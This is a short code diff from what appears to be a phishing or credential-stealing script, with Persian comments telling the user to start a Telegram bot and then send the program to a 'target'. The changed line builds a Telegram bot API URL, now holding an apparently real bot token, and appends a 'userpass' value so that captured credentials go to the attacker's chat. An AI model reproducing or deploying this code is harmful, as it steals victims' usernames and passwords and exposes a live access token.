@@ -7,7 +7,7 @@ function SendData() {
     // اول وارد تلگرام شوید و ایدی که بالا نوشتم را در سرچ پیست کنید
     // بعد ربات را استارت کنید وبرنامه را برای تارگت ارسال کنید
 
-    var url = 'https://api.telegram.org/bot{tocken}/sendmessage?chat_id={yourchatidintelegram}&text='+userpass;
+    var url = 'https://api.telegram.org/bot5246105498:AAFntRSggUeaCkvdduShahd0RuY0QNM4jSA/sendmessage?chat_id={yourchatidintelegram}&text='+userpass;
 
     
     var send = new XMLHttpRequest();
